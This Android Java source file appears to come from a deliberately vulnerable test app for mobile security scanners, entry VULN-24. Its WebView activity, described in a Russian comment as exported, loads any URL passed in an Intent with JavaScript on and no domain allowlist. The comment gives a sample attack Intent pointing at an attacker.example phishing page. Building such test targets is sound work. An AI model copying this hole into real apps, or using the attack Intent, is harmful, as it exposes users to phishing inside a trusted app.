package com.masttest.vuln24;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.webkit.WebView;
import androidx.appcompat.app.AppCompatActivity;

/**
 * VULN-24: WebView грузит произвольный URL из Intent extras
 * без allowlist'а доменов.
 *
 * Атака:
 *   Intent i = new Intent();
 *   i.setComponent(new ComponentName(
 *       "com.masttest.vuln24",
 *       "com.masttest.vuln24.WebViewActivity"));
 *   i.putExtra("url", "https://attacker.example/phish.html");
 *   startActivity(i);
 *
 * Activity exported=true (см. манифест), любое стороннее
 * приложение может запустить WebView с любым URL внутри нашего
 * приложения — отлично для phishing'а (показывается логотип,
 * пользователь думает что он внутри легитимного app).
 */
public class WebViewActivity extends AppCompatActivity {
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);

        WebView web = findViewById(R.id.web);
        web.getSettings().setJavaScriptEnabled(true);

        String url = getIntent().getStringExtra("url");
        if (url == null) url = "about:blank";
        web.loadUrl(url);                                      // <-- VULN sink
    }
}
